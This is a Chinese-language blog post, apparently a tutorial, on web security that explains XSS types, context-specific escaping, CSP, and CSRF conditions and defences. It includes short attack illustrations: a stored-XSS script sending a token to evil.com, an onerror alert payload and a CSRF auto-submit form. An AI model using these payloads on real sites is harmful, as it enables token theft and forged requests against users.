@@ -1,0 +1,1273 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.png">
+  <link rel="icon" href="/img/1.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="iopasd">
+  <meta name="keywords" content="Vue3,Python,Docker,SQL,HTTP,全栈,技术笔记">
+  
+    <meta name="description" content="每日技术博客 · 2026-09-30 · 第 044 篇 安全系列第一篇。XSS 的三种触发路径、CSRF 成立的条件、以及注入类漏洞的通用修法 —— 全都落在「不可信数据进入解释器」这一件事上。  📚 安全系列目录   章节 主题 状态    一 XSS、CSRF 与注入 本篇   二 认证、授权与密钥管理 已发布    开场：漏洞的本质是数据越过了「解释器边界」   漏洞 不可信数据进入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="每日技术博客 044 · Web 安全（一）：XSS、CSRF 与注入">
+<meta property="og:url" content="https://ethan-iopasd.github.io/2026/09/30/%E6%AF%8F%E6%97%A5%E6%8A%80%E6%9C%AF%E5%8D%9A%E5%AE%A2044-Web%E5%AE%89%E5%85%A8XSS%E4%B8%8ECSRF/index.html">
+<meta property="og:site_name" content="Ethan-iopasd">
+<meta property="og:description" content="每日技术博客 · 2026-09-30 · 第 044 篇 安全系列第一篇。XSS 的三种触发路径、CSRF 成立的条件、以及注入类漏洞的通用修法 —— 全都落在「不可信数据进入解释器」这一件事上。  📚 安全系列目录   章节 主题 状态    一 XSS、CSRF 与注入 本篇   二 认证、授权与密钥管理 已发布    开场：漏洞的本质是数据越过了「解释器边界」   漏洞 不可信数据进入">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-30T14:40:00.000Z">
+<meta property="article:modified_time" content="2026-09-30T05:51:47.311Z">
+<meta property="article:author" content="iopasd">
+<meta property="article:tag" content="security">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>每日技术博客 044 · Web 安全（一）：XSS、CSRF 与注入 - Ethan-iopasd</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ethan-iopasd.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ethan</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Naruto.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="每日技术博客 044 · Web 安全（一）：XSS、CSRF 与注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-09-30 22:40" pubdate>
+          2026年9月30日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">每日技术博客 044 · Web 安全（一）：XSS、CSRF 与注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>每日技术博客 · 2026-09-30 · 第 044 篇</p>
+<p>安全系列第一篇。XSS 的三种触发路径、CSRF 成立的条件、以及注入类漏洞的通用修法 —— 全都落在「不可信数据进入解释器」这一件事上。</p>
+</blockquote>
+<h2 id="📚-安全系列目录"><a href="#📚-安全系列目录" class="headerlink" title="📚 安全系列目录"></a>📚 安全系列目录</h2><table>
+<thead>
+<tr>
+<th>章节</th>
+<th>主题</th>
+<th>状态</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>一</td>
+<td>XSS、CSRF 与注入</td>
+<td><strong>本篇</strong></td>
+</tr>
+<tr>
+<td>二</td>
+<td>认证、授权与密钥管理</td>
+<td>已发布</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="开场：漏洞的本质是数据越过了「解释器边界」"><a href="#开场：漏洞的本质是数据越过了「解释器边界」" class="headerlink" title="开场：漏洞的本质是数据越过了「解释器边界」"></a>开场：漏洞的本质是数据越过了「解释器边界」</h2><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>不可信数据进入的解释器</th>
+<th>修法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>XSS</td>
+<td><strong>浏览器</strong>（HTML &#x2F; JS &#x2F; CSS 解析器）</td>
+<td>输出转义 + CSP</td>
+</tr>
+<tr>
+<td>SQL 注入</td>
+<td><strong>数据库</strong>（SQL 解析器）</td>
+<td>参数化查询</td>
+</tr>
+<tr>
+<td>命令注入</td>
+<td><strong>Shell</strong></td>
+<td>不用 shell，传参数数组</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td><strong>服务端 HTTP 客户端</strong></td>
+<td>目标地址白名单</td>
+</tr>
+<tr>
+<td>路径穿越</td>
+<td><strong>文件系统</strong></td>
+<td>规范化 + 前缀校验</td>
+</tr>
+<tr>
+<td>开放重定向</td>
+<td><strong>浏览器跳转</strong></td>
+<td>目标白名单</td>
+</tr>
+</tbody></table>
+<p>所有修法都只有两种形态：<strong>参数化（让数据永远无法被当作代码）</strong> 或者 <strong>白名单（枚举所有合法值）</strong>。黑名单过滤一律不可靠。</p>
+<h2 id="一、XSS-的三种类型"><a href="#一、XSS-的三种类型" class="headerlink" title="一、XSS 的三种类型"></a>一、XSS 的三种类型</h2><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>数据从哪来</th>
+<th>存不存服务端</th>
+<th>触发方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>存储型（Stored）</td>
+<td>数据库</td>
+<td>✅ <strong>持久化</strong></td>
+<td>任何访问该页面的用户</td>
+</tr>
+<tr>
+<td>反射型（Reflected）</td>
+<td>本次请求参数</td>
+<td>❌ 不存</td>
+<td>诱导受害者点击构造好的链接</td>
+</tr>
+<tr>
+<td>DOM 型（DOM-based）</td>
+<td><strong>前端 JS 自己</strong></td>
+<td>❌ 不存，<strong>服务端完全看不到</strong></td>
+<td>URL fragment &#x2F; <code>postMessage</code> &#x2F; 存储</td>
+</tr>
+</tbody></table>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 存储型：评论内容直接拼接进 HTML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;comment&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/token&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">t</span>=&gt;</span><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;//evil.com?t=&#x27;</span>+t))</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/search?q=&lt;img</span> src=x <span class="hljs-string">onerror=alert(document.domain)&gt;</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 反射型：服务端把 q 原样回显 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>没有找到 &quot;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.domain)</span>&gt;</span>&quot; 的结果<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// DOM 型：数据全程没经过服务端</span><br><span class="hljs-keyword">const</span> name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLSearchParams</span>(location.<span class="hljs-property">search</span>).<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;name&#x27;</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;greet&#x27;</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-string">&#x27;Hi, &#x27;</span> + name;   <span class="hljs-comment">// ❌</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>DOM 型 XSS 在服务端日志里看不到 payload</strong>，因为参数在 <code>#</code> 后面或由前端拼接。WAF 和请求日志都抓不到，只能在代码审计和 CSP 里兜。</p>
+</blockquote>
+<p>危险 sink 清单（前端）：</p>
+<table>
+<thead>
+<tr>
+<th>sink</th>
+<th>危险点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>innerHTML</code> &#x2F; <code>outerHTML</code></td>
+<td>解析 HTML，<code>&lt;img onerror&gt;</code> 直接执行</td>
+</tr>
+<tr>
+<td><code>document.write</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>eval</code> &#x2F; <code>new Function</code> &#x2F; <code>setTimeout(字符串)</code></td>
+<td>直接执行代码</td>
+</tr>
+<tr>
+<td><code>location.href = userInput</code></td>
+<td><code>javascript:</code> 伪协议</td>
+</tr>
+<tr>
+<td><code>jQuery</code> 的 <code>$()</code> &#x2F; <code>.html()</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><code>React</code> 的 <code>dangerouslySetInnerHTML</code></td>
+<td>名字已经警告你了</td>
+</tr>
+<tr>
+<td><code>Vue</code> 的 <code>v-html</code></td>
+<td>同上</td>
+</tr>
+</tbody></table>
+<p>安全替代：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">el.<span class="hljs-property">textContent</span> = name;                       <span class="hljs-comment">// ✅ 纯文本</span><br>el.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">&#x27;data-name&#x27;</span>, name);          <span class="hljs-comment">// ✅ 属性用 setAttribute</span><br>el.<span class="hljs-property">href</span> = <span class="hljs-string">&#x27;/user/&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(id); <span class="hljs-comment">// ✅ 先拼路径再整体赋值</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <code>innerHTML = &#39;&lt;b&gt;hi&lt;/b&gt;&#39;</code> 看着无害，但只要有<strong>一处</strong>用户数据拼进来就破了。别在业务代码里用 <code>innerHTML</code>，用 <code>textContent</code> 或者框架的默认插值（React 的 <code>&#123;&#125;</code>、Vue 的 <code>&#123;&#123; &#125;&#125;</code> 都会自动转义）。</p>
+</blockquote>
+<h2 id="二、输出转义：每种上下文规则不同"><a href="#二、输出转义：每种上下文规则不同" class="headerlink" title="二、输出转义：每种上下文规则不同"></a>二、输出转义：每种上下文规则不同</h2><p><strong>同一个字符串，在不同上下文需要不同的转义。</strong> 这是 XSS 修复最常见的错误来源。</p>
+<table>
+<thead>
+<tr>
+<th>上下文</th>
+<th>位置</th>
+<th>需要转义</th>
+<th>错误做法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTML 文本</td>
+<td><code>&lt;p&gt;HERE&lt;/p&gt;</code></td>
+<td><code>&amp; &lt; &gt; &quot; &#39;</code></td>
+<td>只转 <code>&lt;</code></td>
+</tr>
+<tr>
+<td>HTML 属性</td>
+<td><code>&lt;input value=&quot;HERE&quot;&gt;</code></td>
+<td><code>&amp; &quot; &#39;</code> + 加引号</td>
+<td>属性不加引号</td>
+</tr>
+<tr>
+<td>事件属性</td>
+<td><code>onclick=&quot;do(HERE)&quot;</code></td>
+<td><strong>JS 转义 + HTML 属性转义（两层）</strong></td>
+<td>只做 HTML 转义</td>
+</tr>
+<tr>
+<td>URL 参数</td>
+<td><code>&lt;a href=&quot;/x?y=HERE&quot;&gt;</code></td>
+<td><code>encodeURIComponent</code></td>
+<td>整体 <code>encodeURI</code> 后拼参数</td>
+</tr>
+<tr>
+<td>JS 字符串</td>
+<td><code>var a = &quot;HERE&quot;</code></td>
+<td>JS 转义 + 引号包裹</td>
+<td>直接插入</td>
+</tr>
+<tr>
+<td>CSS</td>
+<td><code>style=&quot;color: HERE&quot;</code></td>
+<td>基本无法安全转义，<strong>用白名单</strong></td>
+<td>转义特殊字符</td>
+</tr>
+<tr>
+<td>JSON 响应</td>
+<td><code>&#123;&quot;a&quot;: HERE&#125;</code></td>
+<td>用序列化库</td>
+<td>字符串拼接</td>
+</tr>
+</tbody></table>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 同一份数据，四种正确写法</span><br><span class="hljs-title function_">esc</span>(htmlText)                     <span class="hljs-comment">// &amp; &lt; &gt; &quot; &#x27;</span><br><span class="hljs-title function_">esc</span>(htmlAttr)                     <span class="hljs-comment">// &amp; &quot; &#x27;</span><br><span class="hljs-built_in">encodeURIComponent</span>(urlParam)      <span class="hljs-comment">// %xx</span><br><span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(value)             <span class="hljs-comment">// JS / JSON 上下文</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong>事件属性（<code>onclick</code>、<code>onerror</code>）是最容易漏的</strong>。<code>&lt;div onclick=&quot;go(&#39;USER_INPUT&#39;)&quot;&gt;</code> 里，HTML 实体解码发生在 JS 解析<strong>之前</strong>，所以只做 HTML 转义的 <code>&amp;#39;</code> 会被解码回 <code>&#39;</code>，直接闭合字符串。<strong>能不用内联事件就不用</strong>。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong><code>javascript:</code> 伪协议</strong>：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code>。修法是<strong>校验协议白名单</strong>（<code>http:</code>、<code>https:</code>、<code>mailto:</code>），不是转义 —— 转义对协议完全无效。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 富文本场景<strong>不能靠转义</strong>，因为需要保留部分标签。正确做法是用成熟的 HTML 消毒库（DOMPurify 等），并且<strong>服务端也要做</strong>，不能只在前端做。</p>
+</blockquote>
+<h2 id="三、CSP：兜底但不是万能"><a href="#三、CSP：兜底但不是万能" class="headerlink" title="三、CSP：兜底但不是万能"></a>三、CSP：兜底但不是万能</h2><p>CSP 的价值是：<strong>就算某处转义漏了，也能阻止脚本执行</strong>。它不能替代转义。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span>:<br>  default-src &#x27;self&#x27;;<br>  script-src &#x27;nonce-r4nd0m&#x27; &#x27;strict-dynamic&#x27;;<br>  object-src &#x27;none&#x27;;<br>  base-uri &#x27;none&#x27;;<br>  frame-ancestors &#x27;none&#x27;;<br>  form-action &#x27;self&#x27;;<br>  upgrade-insecure-requests<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>作用</th>
+<th>建议</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>default-src &#39;self&#39;</code></td>
+<td>其它指令的兜底</td>
+<td>必配</td>
+</tr>
+<tr>
+<td><code>script-src</code></td>
+<td>脚本来源</td>
+<td><strong>用 nonce，不用 <code>&#39;unsafe-inline&#39;</code></strong></td>
+</tr>
+<tr>
+<td><code>object-src &#39;none&#39;</code></td>
+<td>禁 <code>&lt;object&gt;</code> &#x2F; <code>&lt;embed&gt;</code></td>
+<td>必配，防 Flash 类历史问题</td>
+</tr>
+<tr>
+<td><code>base-uri &#39;none&#39;</code></td>
+<td>禁 <code>&lt;base&gt;</code> 被改</td>
+<td>必配，防相对路径劫持</td>
+</tr>
+<tr>
+<td><code>frame-ancestors &#39;none&#39;</code></td>
+<td>防被嵌套</td>
+<td>取代 <code>X-Frame-Options</code></td>
+</tr>
+<tr>
+<td><code>form-action &#39;self&#39;</code></td>
+<td>限制表单提交目标</td>
+<td>防表单劫持</td>
+</tr>
+<tr>
+<td><code>report-uri</code> &#x2F; <code>report-to</code></td>
+<td>违规上报</td>
+<td>上线初期必配</td>
+</tr>
+</tbody></table>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy-Report-Only</span><span class="hljs-punctuation">: </span>default-src &#x27;self&#x27;; report-to /csp-report<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>⚠️ <strong><code>&#39;unsafe-inline&#39;</code> 一旦出现，CSP 基本等于没有。</strong> 它会放行所有内联 <code>&lt;script&gt;</code> 和 <code>on*</code> 属性，而 XSS 注入的正是这些。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ <strong><code>&#39;unsafe-inline&#39;</code> 和 nonce 同时存在时，nonce 优先、<code>&#39;unsafe-inline&#39;</code> 被忽略</strong>（在支持 CSP3 的浏览器上）—— 但老浏览器只认 <code>&#39;unsafe-inline&#39;</code>。<strong>两个一起写等于给老浏览器留门。</strong></p>
+</blockquote>
+<blockquote>
+<p>⚠️ <code>&#39;strict-dynamic&#39;</code> 让被 nonce 标记的脚本可以动态加载其它脚本，<strong>使域名白名单失效</strong>。这是刻意的：现代前端 bundle 会从 CDN 拉 chunk，域名白名单根本列不全。用 <code>&#39;strict-dynamic&#39;</code> 时必须配合 nonce&#x2F;hash。</p>
+</blockquote>
+<blockquote>
+<p>⚠️ 引入第三方脚本（统计、客服、A&#x2F;B 测试）会<strong>直接放大 CSP 的攻击面</strong> —— 它们能加载任意代码，且很多会往页面里注入内联脚本。上第三方前先确认它支持 nonce。</p>
+</blockquote>
+<p>现代加固手段：<strong>Trusted Types</strong>（<code>require-trusted-types-for &#39;script&#39;</code>）在浏览器层面禁止把字符串赋给 <code>innerHTML</code> 等 sink，从根源上消灭 DOM 型 XSS。</p>
+<h2 id="四、CSRF：成立需要三个条件"><a href="#四、CSRF：成立需要三个条件" class="headerlink" title="四、CSRF：成立需要三个条件"></a>四、CSRF：成立需要三个条件</h2><table>
+<thead>
+<tr>
+<th>条件</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1. 凭据由<strong>浏览器自动携带</strong></td>
+<td>Cookie、HTTP Basic、mTLS、客户端证书</td>
+</tr>
+<tr>
+<td>2. 攻击者<strong>能构造请求</strong>但<strong>读不到响应</strong></td>
+<td>跨站 <code>fetch</code> 受同源策略限制</td>
+</tr>
+<tr>
+<td>3. 参数<strong>可预测</strong></td>
+<td>攻击者知道要发什么</td>
+</tr>
+</tbody></table>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 攻击者页面上的隐藏表单 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://bank.example.com/transfer&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;f&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;to&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;attacker&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;amount&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;10000&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;f&#x27;</span>).<span class="hljs-title function_">submit</span>()</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>浏览器会自动带上 <code>bank.example.com</code> 的 Cookie —— 请求就成功了。</p>
+<blockquote>
+<p>⚠️ <strong><code>fetch</code> + <code>XHR</code> 也照样能打 CSRF</strong>。跨站 <code>fetch</code> 默认不带 Cookie，但加 <code>credentials: &#39;include&#39;</code> 就带；而且<strong>表单提交、<code>&lt;img&gt;</code>、<code>&lt;link&gt;</code> 这些根本不受同源策略限制</strong>。所以「用了 AJAX 就没 CSRF」是错的。</p>
+</blockquote>
+<h3 id="防御手段对比"><a href="#防御手段对比" class="headerlink" title="防御手段对比"></a>防御手段对比</h3><table>
+<thead>
+<tr>
+<th>手段</th>
+<th>原理</th>
+<th>能否单独用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>SameSite=Lax</code> &#x2F; <code>Strict</code></td>
+<td>跨站请求不带 Cookie</td>
+<td>✅ 主要防线</td>
+</tr>
+<tr>
+<td><code>SameSite=None</code> + <code>Secure</code></td>
+<td>明确允许跨站</td>
+<td>⚠️ 必须配 CSRF Token</td>
+</tr>
+<tr>
+<td>CSRF Token（同步令牌）</td>
+<td>攻击者猜不到，跨站读不到</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Double Submit Cookie</td>
+<td>Token 存 Cookie，请求时比对</td>
+<td>⚠️ 需配 <code>__Host-</code> 前缀</td>
+</tr>
+<tr>
+<td>校验 <code>Origin</code> &#x2F; <code>Referer</code></td>
+<td>检查来源</td>
+<td>✅ 但 <code>Referer</code> 可能被裁剪</td>
+</tr>
+<tr>
+<td>自定义请求头</td>
+<td>跨站无法带自定义头（触发预检）</td>
+<td>✅ 需 CORS 配合</td>
+</tr>
+<tr>
+<td>要求重新输入密码</td>
+<td>强确认</td>
+<td>⚠️ 影响体验</td>
+</tr>
+</tbody></table>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>session=abc; Secure; HttpOnly; SameSite=Lax; Path=/<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th><code>SameSite</code> 值</th>
+<th>跨站请求是否带 Cookie</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>Strict</code></td>
+<td>❌ 完全不带（从外站点链接进来也不带，会「看起来没登录」）</td>
+</tr>
+<tr>
+<td><code>Lax</code></td>
+<td>⚠️ <strong>顶级导航的 GET 带</strong>，跨站 POST &#x2F; <code>fetch</code> &#x2F; <code>&lt;img&gt;</code> 不带</td>
+</tr>
+<tr>
+<td><code>None</code></td>
+<td>✅ 都带（**必须同时有 <code>Secure</code>**）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>⚠️ <strong>浏览器默认值已经是 <code>Lax</code><strong>（Chrome 80 起）。所以「没写 SameSite」不等于「没保护」，但</strong>依赖默认值是危险的</strong> —— 用户浏览器版本不可控。<strong>显式写出来。</strong></p>
+</blockquote>
+<blockquote>
